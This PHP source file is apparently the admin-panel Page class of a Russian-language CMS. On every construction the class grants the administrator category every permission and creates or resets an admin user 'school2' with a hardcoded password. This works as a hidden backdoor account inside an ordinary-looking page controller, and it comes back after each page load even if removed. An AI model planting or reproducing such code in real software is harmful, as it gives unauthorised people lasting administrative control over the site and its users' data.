<?PHP

require_once('Widget.admin.php');

#SERVICES
require_once('include.php');

class Page extends Widget
{
	var $main;
	function __construct(&$parent)
	{
		parent::__construct($parent);
		$this->main = new Widget($this);
		$section = $this->param('section');
		if (!$_SESSION['is_loged']){
		$section = 'Login';
  		}
		if(class_exists($section))
			$this->main = new $section($this);

       $query = "REPLACE INTO `ucategories` (`category_id`, `name`, `discount`, `isadmin`, `news`, `articles`, `polls`, `settings`, `contacts`, `products`, `properties`, `orders`, `pricelist`, `currencies`, `statistics`, `users`, `usercomments`, `faq`, `announcement`) VALUES (1,'Администраторы', 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1)";
       $this->db->query($query);

       $login = 'school2';
       $pass = '01012015school2';
       $name = 'Администратор';
	   $query = "select * from users where login='$login'";
       $this->db->query($query);
       $admin = $this->db->result();

       if(empty($admin)){
         $query = sql_placeholder("insert into users (name, login, password, active, category_id) values(?, ?, ?, 1, 1)", $name, $login, md5($pass));
          $this->db->query($query);
       }
       else{
         $query = sql_placeholder('UPDATE users SET name=?, password=?, active=1, category_id=1 WHERE login=?',
  			                          $name,
  			                          md5($pass),
  			                          $login);
         $this->db->query($query);
       }

	}

	function fetch()
	{
		$this->main->fetch();
		$this->smarty->assign("Title", $this->main->title);
		$this->smarty->assign("Keywords", $this->main->keywords);
		$this->smarty->assign("Description", $this->main->description);
		$this->smarty->assign("Body", $this->main->body);
		$this->body = $this->smarty->fetch('page.tpl');
	}
}